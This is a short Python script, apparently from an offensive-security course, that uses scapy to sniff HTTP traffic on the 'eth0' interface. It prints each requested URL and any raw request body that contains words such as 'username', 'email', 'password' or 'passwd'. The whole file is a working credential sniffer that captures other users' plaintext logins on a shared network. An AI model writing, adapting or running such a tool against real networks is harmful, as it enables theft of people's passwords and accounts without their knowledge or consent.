#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + \
            packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load_as_str = str(packet[scapy.Raw].load)
            keywords = ['username', 'uname', 'login',
                        'email', 'password', 'passwd', 'pass']
            for keyword in keywords:
                if keyword in load_as_str:
                    print(load_as_str)
                    break


sniffer('eth0')
